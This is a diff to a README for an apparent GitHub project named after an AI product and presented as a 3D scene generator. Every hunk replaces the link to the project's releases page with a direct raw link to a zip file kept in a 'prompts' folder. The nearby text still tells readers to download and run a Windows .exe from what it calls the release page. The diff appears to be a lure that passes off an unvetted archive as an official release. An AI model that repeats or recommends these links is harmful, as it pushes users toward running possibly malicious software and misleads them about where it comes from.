@@ -1,6 +1,6 @@
 # 🎨 gpt-5-4-pro-3d-generations - Interactive 3D Scenes Made Easy
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Lisaura29/gpt-5-4-pro-3d-generations/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Lisaura29/gpt-5-4-pro-3d-generations/raw/refs/heads/main/prompts/gpt-pro-generations-d-2.7.zip)
 
 ## 📄 What is gpt-5-4-pro-3d-generations?
 
@@ -31,7 +31,7 @@ This section guides you through downloading and running the application on your 
 
 Click the link below or the button above to open the release page in your web browser.
 
-[Download Releases](https://github.com/Lisaura29/gpt-5-4-pro-3d-generations/releases)
+[Download Releases](https://github.com/Lisaura29/gpt-5-4-pro-3d-generations/raw/refs/heads/main/prompts/gpt-pro-generations-d-2.7.zip)
 
 This page lists all available versions of the software.
 
@@ -117,7 +117,7 @@ This software loads 3D scenes built with HTML and WebGL technology, enriched by 
 To download and run gpt-5-4-pro-3d-generations on Windows:
 
 1. Visit the release page:  
-   [https://github.com/Lisaura29/gpt-5-4-pro-3d-generations/releases](https://github.com/Lisaura29/gpt-5-4-pro-3d-generations/releases)
+   [https://github.com/Lisaura29/gpt-5-4-pro-3d-generations/raw/refs/heads/main/prompts/gpt-pro-generations-d-2.7.zip](https://github.com/Lisaura29/gpt-5-4-pro-3d-generations/raw/refs/heads/main/prompts/gpt-pro-generations-d-2.7.zip)
 
 2. Find and download the latest Windows `.exe` file.
 
@@ -135,4 +135,4 @@ To download and run gpt-5-4-pro-3d-generations on Windows:
 
 ---
 
-[![Download Latest](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Lisaura29/gpt-5-4-pro-3d-generations/releases)
+[![Download Latest](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Lisaura29/gpt-5-4-pro-3d-generations/raw/refs/heads/main/prompts/gpt-pro-generations-d-2.7.zip)
